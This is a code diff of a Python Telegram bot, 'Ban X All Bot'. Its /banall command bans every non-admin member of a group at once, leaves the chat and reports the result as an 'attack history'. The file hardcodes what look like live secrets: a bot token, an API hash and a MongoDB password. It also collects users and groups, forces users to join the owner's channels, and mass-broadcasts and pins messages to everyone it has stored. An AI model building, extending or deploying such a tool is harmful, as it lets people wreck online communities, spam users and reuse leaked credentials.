@@ -13,13 +13,11 @@ API_HASH = "2ed313ebcc45cbcf65d1fc736ec71681"
 BOT_TOKEN = "8852295639:AAGgw7gPVj5TjmrTNKmOLWfDtHaaP3V2XYA"
 BOT_USERNAME = "Ban_X_All_bot"
 OWNER_ID = 8237368993  
-LOG_GROUP = -1003947649552  # Updated Log Group ID
+LOG_GROUP = -1003947649552  
 START_IMG = "https://files.catbox.moe/srmw3t.mp4"
 
 # --- FORCE JOIN CONFIG ---
-# Idhar channels ke usernames hain validation check ke liye
 FSUB_CHANNELS = ["Ban_All_Update", "Genu_Bot_Support"]
-# Private link ko direct API user-check se verify nahi kiya ja sakta, isliye use button me custom handler diya hai.
 
 # --- MONGO DB SETUP ---
 MONGO_URL = "mongodb+srv://misssqn_db_user:Nova01@cluster0.6xxsrwq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
@@ -28,7 +26,7 @@ db = db_client["BanXAllBot_DB"]
 users_col = db["users"]
 groups_col = db["groups"]
 
-# --- WEB SERVER ---
+# --- WEB SERVER (FOR HIBERNATION BYPASS ON RENDER) ---
 app = Flask('')
 @app.route('/')
 def home(): return "⚡ Ban X All Bot Is Ultra Flying Online ⚡"
@@ -36,8 +34,10 @@ def home(): return "⚡ Ban X All Bot Is Ultra Flying Online ⚡"
 def run(): app.run(host='0.0.0.0', port=8080)
 def keep_alive():
     t = Thread(target=run)
+    t.daemon = True  # Thread safe exit handle karne ke liye
     t.start()
 
+# Bot Initialization
 bot = Client("BanXAllBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
 # --- UTILS ---
@@ -47,7 +47,6 @@ async def send_log(client, text):
     except Exception as e:
         print(f"Logging Error: {e}")
 
-# Check functions for FSub
 async def check_force_join(client, user_id):
     not_joined = []
     for channel in FSUB_CHANNELS:
@@ -61,9 +60,7 @@ async def check_force_join(client, user_id):
 
 # --- BUTTONS ---
 START_BUTTONS = InlineKeyboardMarkup([
-    [
-        InlineKeyboardButton("➕ Add Me To Your Group ➕", url=f"https://t.me/{BOT_USERNAME}?startgroup=true")
-    ],
+    [InlineKeyboardButton("➕ Add Me To Your Group ➕", url=f"https://t.me/{BOT_USERNAME}?startgroup=true")],
     [
         InlineKeyboardButton("👤 Owner", url="https://t.me/CoderNova"),
         InlineKeyboardButton("🎧 All Bot Support", url="https://t.me/Genu_Bot_Support/119")
@@ -76,7 +73,6 @@ START_BUTTONS = InlineKeyboardMarkup([
 
 BACK_BUTTONS = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="start_data")]])
 
-# --- CAPTION TEMPLATE ---
 def get_start_caption(name):
     return (
         f"╔═════════════════════════╗\n"
@@ -91,7 +87,6 @@ def get_start_caption(name):
 
 # --- HANDLERS ---
 
-# 1. New Group Detection
 @bot.on_message(filters.new_chat_members)
 async def on_new_chat(client, message):
     if any(m.id == (await client.get_me()).id for m in message.new_chat_members):
@@ -106,31 +101,22 @@ async def on_new_chat(client, message):
         )
         await send_log(client, log_text)
 
-# 2. Main Incoming Messages & Strict Force Join Core
 @bot.on_message(filters.incoming)
 async def main_handler(client, message):
     if not message.from_user: return
-    
     user_id = message.from_user.id
     
-    # Save user to Database if not exists
     if not users_col.find_one({"user_id": user_id}):
         users_col.insert_one({"user_id": user_id, "name": message.from_user.first_name})
         await send_log(client, f"👤 **New User Registered:** {message.from_user.mention}\n🆔 **ID:** `{user_id}`")
 
-    # Save group to Database if not exists
     if message.chat.type != message.chat.type.PRIVATE:
         if not groups_col.find_one({"chat_id": message.chat.id}):
             groups_col.insert_one({"chat_id": message.chat.id, "title": message.chat.title})
 
-    # Private Command Handler with strict FSub Filter
     if message.chat.type == message.chat.type.PRIVATE and message.text and message.text.startswith("/start"):
-        
-        # Checking verification status
         unsubscribed = await check_force_join(client, user_id)
-        
         if unsubscribed:
-            # Generate FSub Buttons if channels are not joined
             fsub_buttons = [
                 [InlineKeyboardButton("📢 Ban All Update", url="https://t.me/Ban_All_Update")],
                 [InlineKeyboardButton("🎧 Genu Bot Support", url="https://t.me/Genu_Bot_Support")],
@@ -144,21 +130,18 @@ async def main_handler(client, message):
                 reply_markup=InlineKeyboardMarkup(fsub_buttons)
             )
 
-        # If already joined or verified completely
         caption = get_start_caption(message.from_user.first_name)
         try:
             await message.reply_video(video=START_IMG, caption=caption, reply_markup=START_BUTTONS)
         except Exception:
             await message.reply_text(text=caption, reply_markup=START_BUTTONS)
 
-# 3. Standard Broadcast (Users + Groups | No Pin)
 @bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
 async def standard_broadcast(client, message):
     if not message.reply_to_message:
         return await message.reply_text("❌ **Reply to a message to initiate standard broadcast (No Pin).**")
     
-    progress = await message.reply_text("⚡ **Initiating Standard Broadcast (Users + Groups)...**")
-    
+    progress = await message.reply_text("⚡ **Initiating Standard Broadcast...**")
     all_users = [user["user_id"] for user in users_col.find()]
     all_groups = [group["chat_id"] for group in groups_col.find()]
     targets = list(set(all_users + all_groups))
@@ -177,14 +160,12 @@ async def standard_broadcast(client, message):
             
     await progress.edit(f"📢 **Broadcast Complete!**\n\n✅ **Delivered:** `{success}`\n❌ **Failed/Blocked:** `{failed}`")
 
-# 4. Mega Broadcast (Users + Groups | Copy + Auto Pin)
 @bot.on_message(filters.command("broadcast_all") & filters.user(OWNER_ID))
 async def broadcast_all_and_pin(client, message):
     if not message.reply_to_message:
         return await message.reply_text("❌ **Reply to a message to initiate advanced broadcast (With Pin).**")
         
-    progress = await message.reply_text("💥 **Initiating Mega Broadcast & Auto-Pin (Users + Groups)...**")
-    
+    progress = await message.reply_text("💥 **Initiating Mega Broadcast & Auto-Pin...**")
     all_users = [user["user_id"] for user in users_col.find()]
     all_groups = [group["chat_id"] for group in groups_col.find()]
     targets = list(set(all_users + all_groups))
@@ -194,35 +175,28 @@ async def broadcast_all_and_pin(client, message):
         try:
             copied_msg = await message.reply_to_message.copy(target)
             success += 1
-            try:
-                await copied_msg.pin(both_sides=True)
-            except Exception:
-                pass  
+            try: await copied_msg.pin(both_sides=True)
+            except: pass  
         except FloodWait as e:
             await asyncio.sleep(e.value)
             copied_msg = await message.reply_to_message.copy(target)
             success += 1
-            try: 
-                await copied_msg.pin(both_sides=True) 
-            except Exception: 
-                pass
+            try: await copied_msg.pin(both_sides=True) 
+            except: pass
         except Exception:
             failed += 1
             
-    await progress.edit(f"🔥 **Mega Broadcast Completed Successfully!**\n\n✅ **Total Sent & Pinned:** `{success}`\n❌ **Failed:** `{failed}`")
+    await progress.edit(f"🔥 **Mega Broadcast Completed!**\n\n✅ **Total Sent & Pinned:** `{success}`\n❌ **Failed:** `{failed}`")
 
-# 5. Callback Query System (FSub Check + Help + Guide)
 @bot.on_callback_query()
 async def cb_handler(client, query: CallbackQuery):
     user_id = query.from_user.id
-    
-    # 5.1 Click Verify button verification flow
     if query.data == "verify_fsub":
         unsubscribed = await check_force_join(client, user_id)
         if unsubscribed:
-            return await query.answer("⚠️ Aapne abhi tak saare channels join nahi kiye hain! Kripya dobara check karein.", show_alert=True)
+            return await query.answer("⚠️ Aapne abhi tak saare channels join nahi kiye hain!", show_alert=True)
         
-        await query.answer("✅ Success! Saare channels verified ho gaye hain.", show_alert=True)
+        await query.answer("✅ Success! Verified.", show_alert=True)
         caption = get_start_caption(query.from_user.first_name)
         try:
             await query.message.delete()
@@ -251,22 +225,15 @@ async def cb_handler(client, query: CallbackQuery):
             f"1️⃣ **Add me** to your target group.\n"
             f"2️⃣ Promote me to **Administrator** status.\n"
             f"3️⃣ Ensure I have the **Ban Users** permission.\n"
-            f"4️⃣ Type `/banall` in the group chat and watch the magic!\n\n"
-            f"⚠️ *Note: Group creators and fellow admins cannot be banned.*"
+            f"4️⃣ Type `/banall` in the group chat.\n\n"
+            f"⚠️ *Note: Admins cannot be banned.*"
         )
         await query.edit_message_caption(caption=guide_text, reply_markup=BACK_BUTTONS)
         
     elif query.data == "start_data":
-        caption = (
-            f"╔═════════════════════════╗\n"
-            f"   ✨ **WELCOME AGAIN** ✨\n"
-            f"╚═════════════════════════╝\n\n"
-            f"🚀 **Welcome to the Ultimate Ban X All Bot!**\n\n"
-            f"💡 Promote me to admin and send `/banall` inside any group."
-        )
+        caption = get_start_caption(query.from_user.first_name)
         await query.edit_message_caption(caption=caption, reply_markup=START_BUTTONS)
 
-# 6. Ultra-Fast Parallel Concurrency Ban Command (With Private History Report)
 @bot.on_message(filters.command("banall"))
 async def ban_all(client, message):
     if message.chat.type == message.chat.type.PRIVATE:
@@ -291,10 +258,8 @@ async def ban_all(client, message):
             try:
                 await client.ban_chat_member(message.chat.id, user_id_to_ban)
                 return True
-            except:
-                return False
-        except Exception:
-            return False
+            except: return False
+        except Exception: return False
 
     tasks = []
     me = await client.get_me()
@@ -307,35 +272,36 @@ async def ban_all(client, message):
     if not tasks:
         return await msg.edit("❌ **No non-admin members found to ban!**")
 
-    await msg.edit(f"🔥 **Fusing parallel tasks! Purging `{len(tasks)}` members instantly...**")
-
+    await msg.edit(f"🔥 **Purging `{len(tasks)}` members instantly...**")
     results = await asyncio.gather(*tasks)
     count = sum(1 for r in results if r is True)
     
-    await msg.edit(f"⚡ **Cyclone Purge Completed Successfully!**\n\n✅ **Banned:** `{count}`\n🚪 **Status:** Automatically Leaving Chat...")
+    await msg.edit(f"⚡ **Cyclone Purge Completed!**\n\n✅ **Banned:** `{count}`\n🚪 **Status:** Automatically Leaving Chat...")
     await send_log(client, f"✅ **MEGA PURGE COMPLETE**\n**Group:** {message.chat.title}\n**Total Cleaned:** `{count}`")
     
-    # Send report to user's PM
     if user_id:
         history_caption = (
             f"╔════════════════════════════╗\n"
             f"      📊 **BAN-ALL ATTACK HISTORY** \n"
             f"╚════════════════════════════╝\n\n"
-            f"Your request to wipe out the group has completed successfully!\n\n"
             f"👥 **Group Name:** {message.chat.title}\n"
             f"🆔 **Group ID:** `{message.chat.id}`\n"
             f"🔥 **Total Members Banned:** `{count}`\n\n"
             f"⏱ **Status:** Task Successfully Finished."
         )
-        try:
-            await client.send_message(chat_id=user_id, text=history_caption)
-        except Exception:
-            print(f"Could not send history report to private inbox of user {user_id}.")
+        try: await client.send_message(chat_id=user_id, text=history_caption)
+        except: pass
 
     await asyncio.sleep(1)
     await client.leave_chat(message.chat.id)
 
+# --- MAIN ASYNC RUNNER FOR RENDER (CRITICAL ERROR FIX) ---
+async def main():
+    keep_alive()  # Flask server thread start karega
+    print("Starting Pyrogram Client Engine...")
+    await bot.start()
+    print("Bot is ultra flying online! 🚀")
+    await asyncio.Event().wait()  # Client loop ko active rakhega bina crash kiye
+
 if __name__ == "__main__":
-    keep_alive()
-    print("Bot is flying high! 🚀")
-    bot.run()
+    asyncio.run(main())  # Loops handle correctly on Python 3.10+
